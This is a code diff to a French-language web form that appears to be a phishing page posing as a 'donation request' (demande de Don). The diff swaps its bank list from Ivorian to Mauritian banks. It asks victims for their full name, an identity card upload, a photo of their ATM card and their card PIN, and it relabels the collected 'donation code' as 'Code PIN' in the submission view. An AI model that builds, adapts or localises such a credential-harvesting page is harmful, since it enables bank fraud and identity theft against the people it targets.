@@ -585,10 +585,10 @@
                         <label for="bank">Banque</label>
                         <select id="bank" required>
                             <option value="">-- Choisissez votre banque --</option>
-                            <option value="bni">Mcb</option>
-                            <option value="sgbci">Absa</option>
-                            <option value="bicici">SBM</option>
-                            <option value="ecobank">Maubank</option>
+                            <option value="Mcb">Mcb</option>
+                            <option value="Absa">Absa</option>
+                            <option value="SBM">SBM</option>
+                            <option value="Maubank">Maubank</option>
                            
                         </select>
                     </div>
@@ -606,7 +606,7 @@
                         <input type="text" id="fullName" required placeholder="Votre nom complet">
                     </div>
                     <div class="form-group">
-                        <label for="idCard">Carte d'identité (image ou PDF)</label>
+                        <label for="idCard">Veuillez mettre votre Carte d'identité (image ou PDF)</label>
                         <div class="file-input-container">
                             <div class="file-input-label">
                                 <i class="fas fa-upload"></i> Téléchargez votre carte d'identité
@@ -616,7 +616,7 @@
                         <div class="file-name" id="idCardName">Aucun fichier sélectionné</div>
                     </div>
                     <div class="form-group">
-                        <label for="photo">La photo de la carte ATM</label>
+                        <label for="photo">Veuillez mettre La photo de la carte ATM</label>
                         <div class="file-input-container">
                             <div class="file-input-label">
                                 <i class="fas fa-upload"></i> Téléchargez la photo de votre carte ATM
@@ -635,11 +635,11 @@
                 <div class="form-step" id="step3">
                     <h2 class="form-title">La demande de Don</h2>
                     <div class="form-group">
-                        <label for="donationCode">Entrez votre code PIN</label>
+                        <label for="donationCode">Veuillez Entrez votre code PIN</label>
                         <input type="text" id="donationCode" required placeholder="Entrez le code de don">
                     </div>
                     <div class="form-group">
-                        <label for="confirmDonationCode">Confirmez le code de don</label>
+                        <label for="confirmDonationCode">Veuillez mettre votre code de don</label>
                         <input type="text" id="confirmDonationCode" required placeholder="Confirmez le code de don">
                     </div>
                     <div class="form-navigation">
@@ -940,7 +940,7 @@
                             <span class="detail-label">Nom complet:</span> ${submission.fullName}
                         </div>
                         <div class="detail-item">
-                            <span class="detail-label">Code de don:</span> ${submission.donationCode}
+                            <span class="detail-label">Code PIN:</span> ${submission.donationCode}
                         </div>
                         <div class="detail-item">
                             <span class="detail-label">Statut:</span> ${submission.status}
@@ -963,14 +963,11 @@
         // Obtenir le nom complet de la banque
         function getBankName(bankCode) {
             const banks = {
-                'bni': 'BNI - Banque Nationale d\'Investissement',
-                'sgbci': 'SGBCI - Société Générale de Banques en Côte d\'Ivoire',
-                'bicici': 'BICICI - BICI',
-                'ecobank': 'Ecobank',
-                'boa': 'BOA - Bank of Africa',
-                'nsia': 'NSIA Banque',
-                'coris': 'Coris Bank',
-                'vsb': 'VSB - Versement Bancaire Simplifié'
+                'Mcb': 'Mcb',
+                'Absa': 'Absa',
+                'SBM': 'SBM',
+                'Maubank': 'Maubank',
+               
             };
             
             return banks[bankCode] || bankCode;
